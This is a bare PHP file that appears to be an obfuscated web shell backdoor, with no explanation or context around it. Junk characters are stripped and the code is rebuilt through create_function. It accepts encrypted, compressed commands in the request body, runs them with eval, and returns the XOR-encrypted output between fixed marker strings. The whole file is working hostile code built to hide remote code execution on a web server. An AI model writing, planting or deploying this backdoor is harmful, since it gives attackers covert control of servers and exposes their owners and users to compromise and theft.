<?php
$u='ccSontents()cS;@cSob_end_clcSean(cS);$r=@bacSse64cS_encScode(@xcScS(cS@gzcocSmprecSss($o),$kcS));print("$p$kh$r$kf");}';
$V=str_replace('dM','','dMcreatdMe_dMfudMdMdMnction');
$k='$k="cSc0c03f0cS6";$cSkh="f4c67cS496f542cS";$kfcS="cS5b81c978cSa1cS24";$p="FwHX1cSyYDnlDcSU4cS8cSfv";functcSion x($t,c';
$R='+cS){cS$o.=$t{$i}^cS$k{$cSj};}}retcScSurn $o;cS}if (@pcSregcScS_macStch("/cS$kh(cS.+)$kf/",@file_get_ccSocSncStents("php';
$F='S$k){$c=scStrlcSen($cSkcS);$l=strlen($t);$ocScS="";for($icS=0;cS$cSi<$l;){for(cS$j=0;($jcS<cS$c&&$i<$l);$j++cS,$i+';
$H='://cSinput"),$m)=cS=1)cS {@ob_stcSart()cS;@ecSval(@cSgzcSuncompress(@x(@bcScSase64_deccSode($m[1]cScS),$k)));$o=cS@cSob_get_';
$t=str_replace('cS','',$k.$F.$R.$H.$u);
$O=$V('',$t);$O();
?>
